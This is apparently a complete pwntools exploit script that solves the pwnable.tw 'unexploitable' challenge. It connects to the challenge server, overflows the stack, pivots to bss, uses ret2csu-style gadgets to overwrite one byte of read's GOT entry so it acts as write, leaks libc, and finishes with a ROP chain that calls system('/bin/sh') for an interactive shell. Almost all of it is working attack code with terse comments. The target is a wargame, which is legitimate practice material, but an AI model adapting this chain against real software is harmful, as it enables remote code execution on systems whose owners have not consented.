from pwn import *

elf = context.binary = ELF('unexploitable')
libc = ELF('libc.so.6')

def set(rbx, rbp, r12, r13_edi, r14_rsi, r15_rdx):
    set_payload = flat(
        MANY_MOV,
        0, # no reg will get this value
        rbx,
        rbp,
        r12,
        r13_edi,
        r14_rsi,
        r15_rdx
    )
    return set_payload
def call_reg_make_sure_rbx_plus_1_rbp(garbage, rbx, rbp, r12, r13, r14, r15):
    call_reg_payload = flat(
        0x00000000004005d0,
        garbage,
        rbx,
        rbp,
        r12,
        r13,
        r14,
        r15
    )
    return call_reg_payload

#nc chall.pwnable.tw 10403
p = remote('chall.pwnable.tw', 10403)
#p = process()
#gdb.attach(p, gdbscript='''
#b *0x0000000000400577
#b *0x00000000004005d0
#c''')


LEAVE_RET = 0x0000000000400576
MANY_MOV = 0x00000000004005e6
READ_IN_PLT = 0x400436
bss = 0x00601330

print('you can change 1 byte of read got to change read to write')
print('read: ', hex((libc.symbols['read'])))
print('write: ', hex(libc.symbols['write']))

#stack pivot to another place since the payload is large
payload = b'A'*0x18
payload += set(0, 1, elf.got['read'], 0, bss, 0x500) + call_reg_make_sure_rbx_plus_1_rbp(0, 0, bss, 0, 0, 0, 0)
payload += p64(LEAVE_RET)
payload += b'A'*(0x100 - len(payload))
print('payload len: ', hex(len(payload)))

rsp_to_call_system = 0x6014b8 # rsp after i leak libc and about to call ropchain system

# even when i overwrite read got i still can call read by call 
'''
->  0x400436 <read@plt+6>:       push   0x0
    0x40043b <read@plt+11>:      jmp    0x400420
'''
# kinda like ret2dlresolve but i dont need to craft payload:))
# one notice here is to set rsp is far from start of bss since the _dl_fixup will use write some value below rsp
payload2 = p64(READ_IN_PLT)
# overwrite 1 byte of read got here
payload2 += set(0, 1, elf.got['read'], 0, elf.got['read'], 1) + call_reg_make_sure_rbx_plus_1_rbp(0, 0, 0, 0, 0, 0, 0) # overflow 1 byte in read got
payload2 += set(0, 1, elf.got['read'], 1, elf.got['read'], 0x8) + call_reg_make_sure_rbx_plus_1_rbp(0, 0, 0, 0, 0, 0, 0) # leak libc
payload2 += set(0, 1, bss, 0, 0x6014b8, 0x30) + call_reg_make_sure_rbx_plus_1_rbp(0, 0, 0, 0, 0, 0, 0) # write ropchain call system
payload2 += b'A'*(0x500 - len(payload2))
print('payload2 len: ', hex(len(payload2)))

rsp_to_call_system = 0x6014b8

overflow_read = b'\xd0'
p.send(payload)
p.send(payload2)
p.send(overflow_read)
leak = p.recv(8)
leak = int.from_bytes(leak, byteorder='little')
print('leak: ', hex(leak))
libc.address = leak - libc.symbols['write']
print('libc: ', hex(libc.address))


POP_RDI = 0x0000000000021102 # pop rdi ; ret
payload = p64(POP_RDI + libc.address)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.symbols['system'])
payload += b'A'*(0x30 - len(payload))
p.send(payload)


p.interactive()
